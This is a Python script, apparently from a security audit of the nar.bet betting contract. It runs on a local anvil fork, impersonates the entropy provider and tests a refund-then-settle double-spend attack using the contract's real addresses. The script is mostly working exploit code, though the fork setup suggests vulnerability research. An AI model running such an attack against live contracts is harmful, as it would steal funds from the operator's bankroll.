#!/usr/bin/env python3
"""nar.bet — FORK ATTACK v3: refund-then-settle double spend.

v2 result (fork, decoded): `RefundTooEarly(have,want)` with want = requestBlock + 2001.
So a refund is claimable only after REFUND_TIMEOUT_BLOCKS(2000) AND only while that same
request is still awaiting -- the clock is bound to the request (a second bet reset it).
The "settle the wins / refund the losses" attack is dead: you must sit ~16.7 min with the
request still unanswered, and the answer is what carries the outcome.

Remaining invariant to test: a request that DOES get refunded after the timeout -- can the
late callback still settle it and pay out? If yes, a stuck-then-fulfilled request pays the
player twice and the BankRoll eats it (refund x settlement ordering).

Steps:
  1. calibrate outcomes: bet + deliver a random, read the balance delta -> find a WINNING
     random and a LOSING random.
  2. double-spend test: bet -> mine 2002 -> Refund() (must now succeed) -> deliver the
     WINNING random -> measure the balance.

Local fork only (127.0.0.1:8555).
Output: fork/refund-doublespend.json
"""
import json, os, time, urllib.request
from eth_abi import encode, decode as abi_decode
from eth_utils import keccak

RPC = "http://127.0.0.1:8555"
BASE = os.path.expanduser("~/.hermes/workspace/SAVAGEAUD/TARGETS/narbet")
OUT = os.path.join(BASE, "fork")

RPS = "0x843d62ad75f5d0b383f8520e23d19174b7961b8e"
ENTROPY = "0xd458261e832415cfd3bae5e416fdf3230ce6f134"
PROVIDER = "0x52deaa1c84233f7bb8c8a45baede41091c616506"
NATIVE = "0x0000000000000000000000000000000000000000"
ACCT0 = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
ACCT1 = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
SEL_PLAY, SEL_REFUND, SEL_STATE, SEL_CB, SEL_FEE = \
    "0x493e7930", "0x0f0aa179", "0xcfea2f6f", "0x52a5f1f8", "0x5768c29a"

ABI = json.load(open(os.path.join(BASE, "recon", "abi-real.json")))
ERRORS = {}
for n, s in ABI["errors"].items():
    ins = (s.get("inputs") or "")
    parts, depth, cur = [], 0, ""
    for ch in ins:
        if ch in "([":
            depth += 1
        elif ch in ")]":
            depth -= 1
        if ch == "," and depth == 0:
            parts.append(cur.strip()); cur = ""
        else:
            cur += ch
    if cur.strip():
        parts.append(cur.strip())
    tt, ok = [], True
    for p in parts:
        t = p.split()[0] if p.split() else p
        if t.startswith("tuple"):
            ok = False
            break
        tt.append(t)
    if ok:
        ERRORS["0x" + keccak(text=f"{n}({','.join(tt)})")[:4].hex()] = (n, tt)

_id = [0]
def rpc(method, params, timeout=90):
    _id[0] += 1
    try:
        d = json.loads(urllib.request.urlopen(urllib.request.Request(
            RPC, data=json.dumps({"jsonrpc": "2.0", "id": _id[0], "method": method,
                                  "params": params}).encode(),
            headers={"Content-Type": "application/json"}), timeout=timeout).read())
    except Exception as e:
        return {"code": -1, "message": str(e)[:150]}
    return d["error"] if "error" in d else d.get("result")


def call(to, data, frm=ACCT0, value=0):
    return rpc("eth_call", [{"from": frm, "to": to, "data": data, "value": hex(value)}, "latest"])


def send(to, data, frm, value=0):
    h = rpc("eth_sendTransaction", [{"from": frm, "to": to, "data": data, "value": hex(value)}])
    return (None, h) if isinstance(h, dict) and h.get("code") else (h, None)


def receipt(h):
    for _ in range(40):
        r = rpc("eth_getTransactionReceipt", [h])
        if r:
            return r
        time.sleep(0.25)
    return None


def bal(a):
    return int(rpc("eth_getBalance", [a, "latest"]), 16)


def blk():
    for _ in range(5):
        r = rpc("eth_blockNumber", [])
        if isinstance(r, str):
            return int(r, 16)
        print("   eth_blockNumber retry:", r)
        time.sleep(0.5)
    raise RuntimeError("eth_blockNumber unavailable")


def mine(n=1):
    """anvil under-mines large counts and can return an error object -> chunk it."""
    done = 0
    while done < n:
        step = min(100, n - done)
        r = rpc("anvil_mine", [hex(step), "0x0"])
        if isinstance(r, dict):
            print("   mine error:", r)
            return done
        done += step
    return done


def mine_to(target):
    guard = 0
    while blk() < target and guard < 300:
        mine(100)
        guard += 1
    return blk()


def decode_err(res):
    if isinstance(res, dict) and ("code" in res or "message" in res):
        e = res
    elif isinstance(res, dict) and res.get("error"):
        e = res["error"]
    else:
        return ("OK", [])
    data = e.get("data") if isinstance(e, dict) else ""
    if isinstance(data, dict):
        data = data.get("data", "")
    if not data or data == "0x" or len(data) < 10:
        return ("EMPTY_REVERT", [])
    sel = data[:10]
    n, tt = ERRORS.get(sel, (f"unknown{sel}", []))
    args = []
    if tt:
        try:
            args = list(abi_decode(tt, bytes.fromhex(data[10:])))
        except Exception:
            args = []
    return (n, args)


def state(player):
    r = call(RPS, SEL_STATE + "0" * 24 + player[2:].lower())
    if isinstance(r, dict):
        return r
    w = r[2:]
    return [int(w[i:i + 64], 16) for i in range(0, len(w), 64)]


def play(player, wager, action=0, num_bets=1):
    fee = int(rpc("eth_call", [{"to": RPS, "data": SEL_FEE}, "latest"]), 16)
    data = SEL_PLAY + encode(["uint256", "address", "uint8", "uint32"],
                             [wager, NATIVE, action, num_bets]).hex()
    h, e = send(RPS, data, player, value=wager * num_bets + fee)
    return h, e, (receipt(h) if h else None), fee


def deliver(seq, rnd_hex):
    rpc("anvil_impersonateAccount", [ENTROPY])
    rpc("anvil_setBalance", [ENTROPY, hex(10 ** 19)])
    data = SEL_CB + encode(["uint64", "address", "bytes32"],
                           [seq, PROVIDER, bytes.fromhex(rnd_hex[2:])]).hex()
    h, e = send(RPS, data, ENTROPY)
    return h, e, (receipt(h) if h else None)


def main():
    out = {"fork_block": blk()}
    W = 10 ** 18
    print("=== 1. outcome calibration (find a winning random) ===")
    wins, losses, ties = [], [], []
    for i in range(1, 9):
        rnd = "0x" + f"{i:02x}" * 32
        b0 = bal(ACCT1)
        h, e, rc, fee = play(ACCT1, W, action=0, num_bets=1)
        if not rc or rc["status"] != "0x1":
            print(f"  rnd={rnd[:10]} bet FAILED {e}"); continue
        seq = state(ACCT1)[1]
        mine_to(blk() + 25)           # get past the 20-block commit window
        deliver(seq, rnd)
        time.sleep(0.4)
        delta = bal(ACCT1) - b0
        # out = wager + fee, so payout recovered = delta + wager + fee.
        # A WIN still nets negative because the 1.4 MON entropy fee is paid every bet --
        # classifying on `delta > 0` reports every bet as a loss (that was v3's first bug).
        payout = delta + W + fee
        klass = "WIN" if payout > W * 1.01 else ("TIE/partial" if payout > 0 else "LOSS")
        print(f"  rnd={rnd[:10]} seq={seq} delta={delta/1e18:+.4f} -> recovered payout "
              f"{payout/1e18:.4f} => {klass}")
        (wins if klass == "WIN" else (ties if klass == "TIE/partial" else losses)).append(rnd)
        if wins:
            break
    out["calibration"] = {"wins": wins, "losses": losses, "ties": ties}
    if not wins:
        print("  no winning random found — cannot test payout; aborting"); return
    win_rnd = wins[0]
    print(f"  chosen WINNING random: {win_rnd}")

    print("\n=== 2. double-spend test (refund after timeout, then a WINNING callback) ===")
    b0 = bal(ACCT0)
    h, e, rc, fee = play(ACCT0, W)
    bet_blk = int(rc["blockNumber"], 16) if rc else None
    print(f"  bet tx={h} status={rc and rc['status']} blk={bet_blk} cost={W+fee}")
    st = state(ACCT0)
    seq = st[1]
    print(f"  request seq={seq}  awaiting={st[4]}")

    # The clock's target comes from the contract itself: RefundTooEarly(have, want).
    # NOTE: anvil_mine(count) silently under-mines large counts (asked for 2002, got 1058),
    # which is how the first run of this test failed to reach the refund at all.
    name0, args0 = decode_err(call(RPS, SEL_REFUND, frm=ACCT0))
    want = args0[1] if (name0 == "RefundTooEarly" and len(args0) == 2) else bet_blk + 2001
    print(f"  refund clock: {name0} want={want} (= bet + {want - bet_blk})")
    mine_to(want + 1)
    print(f"  mined to block {blk()} (bet+{blk()-bet_blk})")
    name, args = decode_err(call(RPS, SEL_REFUND, frm=ACCT0))
    print(f"  Refund() eth_call -> {name} {args}")
    hr, er = send(RPS, SEL_REFUND, ACCT0)
    rcr = receipt(hr) if hr else None
    print(f"  Refund() tx={hr} status={rcr and rcr['status']} err={er}")
    after_refund = bal(ACCT0)
    print(f"  balance delta after refund: {(after_refund-b0)/1e18:+.4f} MON")
    st_r = state(ACCT0)
    print(f"  GetState after refund: {st_r}")
    if rcr:
        print("  refund logs:", [(l["topics"][0][:14], l["address"][:12]) for l in rcr["logs"]])

    print(f"\n  now delivering the KNOWN WINNING random {win_rnd} for the refunded request...")
    hc, ec, rcc = deliver(seq, win_rnd)
    print(f"  callback tx={hc} status={rcc and rcc['status']} err={ec}")
    final = bal(ACCT0)
    print(f"  FINAL balance delta: {(final-b0)/1e18:+.4f} MON")
    print(f"  GetState after late callback: {state(ACCT0)}")
    if rcc:
        print("  callback logs:", [(l["topics"][0][:14], l["address"][:12]) for l in rcc["logs"]])

    out["double_spend"] = {
        "bet_block": bet_blk, "seq": seq,
        "refund_status": rcr and rcr["status"], "refund_tx": hr,
        "state_after_refund": st_r,
        "callback_after_refund_status": rcc and rcc["status"],
        "balance_delta_total": (final - b0) / 1e18,
        "winning_random_used": win_rnd,
    }
    json.dump(out, open(os.path.join(OUT, "refund-doublespend.json"), "w"), indent=1)
    print("\nsaved fork/refund-doublespend.json")


if __name__ == "__main__":
    main()
